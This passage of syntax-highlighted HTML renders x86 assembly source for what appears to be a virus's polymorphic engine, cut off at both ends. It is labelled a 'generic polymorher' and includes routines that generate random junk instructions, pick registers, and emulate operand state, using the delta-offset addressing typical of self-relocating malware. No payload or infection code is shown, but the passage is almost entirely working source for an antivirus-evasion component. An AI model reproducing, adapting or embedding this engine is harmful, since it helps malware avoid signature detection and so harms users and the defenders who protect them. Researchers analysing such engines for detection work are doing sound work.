        
</span><span class="sc1">;        cmp     al,'X'</span><span class="sc0">
</span><span class="sc1">;        jz      GetRandomReg</span><span class="sc0">

</span><span class="sc1">;        sub     eax,'0'</span><span class="sc0">
        
</span><span class="sc1">;        add     esi,ecx</span><span class="sc0">
</span><span class="sc1">;        ret</span><span class="sc0">

</span><span class="sc1">;   ReadValue:</span><span class="sc0">
</span><span class="sc1">;        lodsd</span><span class="sc0">
</span><span class="sc1">;        add     esi,ecx</span><span class="sc0">
</span><span class="sc1">;        ret</span><span class="sc0">


</span><span class="sc5">GetRandomReg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AsciiToNum</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RandomRegs</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; eax -&gt; RandomReg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Uninitialized</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetRandomRegPtrInitialize</span><span class="sc0">       </span><span class="sc1">; There is no RnR</span><span class="sc0">
                                                </span><span class="sc1">; Xx, create one</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; eax = Xx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetRandomRegPtrInitialize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

     
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWriteableReg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; Mov RR,Random Operand</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">



























</span><span class="sc1">; -----------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ---------------------------- Generic polymorher</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------</span><span class="sc0">

</span><span class="sc1">; This proc takes data from WhereFrom and WhereTo and</span><span class="sc0">
</span><span class="sc1">; creates instructions from that data.</span><span class="sc0">

</span><span class="sc5">HowMuchTrash</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">LinesOfTrash</span><span class="sc0">

</span><span class="sc5">RandomProcs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0">                               </span><span class="sc1">; number of instructions</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6</span><span class="sc0">                               </span><span class="sc1">; how often it should come up</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MovPos</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">AddPos</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SubPos</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">OrPos</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">XorPos</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">AndPos</span><span class="sc0">



  </span><span class="sc5">GenerateTrash</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">HowMuchTrash</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; 1/LinesOfTrash that we</span><span class="sc0">
                                                </span><span class="sc1">; stop creating trash</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return</span><span class="sc0">




        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetWriteable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ToOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ToType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomOperand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FromOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FromTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">RandomProcs</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        
      </span><span class="sc5">Label36</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Label36</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">RandomProcs</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc5">Label37</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> 
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Label37</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">RandomProcs</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">InstructionData</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EmulateInstruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EmuProc</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GenerateTrash</span><span class="sc0">


</span><span class="sc1">; ------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; ---------------------------- Emulation functions</span><span class="sc0">
</span><span class="sc1">; ------------------------------------------------</span><span class="sc0">

  </span><span class="sc5">AddInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">SubInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">MovInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">OrInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">        
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">XorInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">AndInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">EmulateInstruction</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ToOperand</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ToType</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FromOperand</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FromTypeOfValue</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">EmuProc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ChangeRegPart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ToOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ToType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">EmulateInstruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OutputOpcode</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UndefineDependentOperands</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">EmulateInstruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Op_mov</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Label34</span><span class="sc0">    

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ToOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ToType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Undefined</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFromInfo</span><span class="sc0">
     </span><span class="sc5">Label34</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">   


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IsOperandUndefined</span><span class="sc0">        
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ChangeOutput</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetTable</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">FromOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">FromTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ValueIsProperlyEmulated_DontNeedThisHack</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">ValueIsProperlyEmulated_DontNeedThisHack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">MakeUndefined</span><span class="sc0">

   </span><span class="sc5">YesChangeIt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">EmulateInstruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

   </span><span class="sc5">ChangeOutput</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetEqualValue</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Output</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">MakeUndefined</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Undefined</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">InfoPtr</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ChangeOutput</span><span class="sc0">


</span><span class="sc5">FoundEquals</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ReadFromType</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetEqualValue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; register table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">FoundEquals</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReadFromType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Registers</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CompareOperands</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ToType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">DontTryMemory</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReadFromType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CompareOperands</span><span class="sc0">

   </span><span class="sc5">DontTryMemory</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FromOperand</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FromTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FoundEquals</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">


        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; eax = Operand</span><span class="sc0">

        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return</span><span class="sc0">                          </span><span class="sc1">; </span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Writeable</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeleteFromInfo</span><span class="sc0">                  </span><span class="sc1">; delete writeable from mem</span><span class="sc0">
                                                </span><span class="sc1">; might still create bugs!!!</span><span class="sc0">
                                                </span><span class="sc1">; will be fixed in the future</span><span class="sc0">
                                                </span><span class="sc1">; (the odds a bug will happen</span><span class="sc0">
                                                </span><span class="sc1">; is extremly low)</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">CompareOperands</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
     </span><span class="sc5">CmpLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Label30</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnAddress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc5">Label30</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ReadFromType</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadOperand</span><span class="sc0">

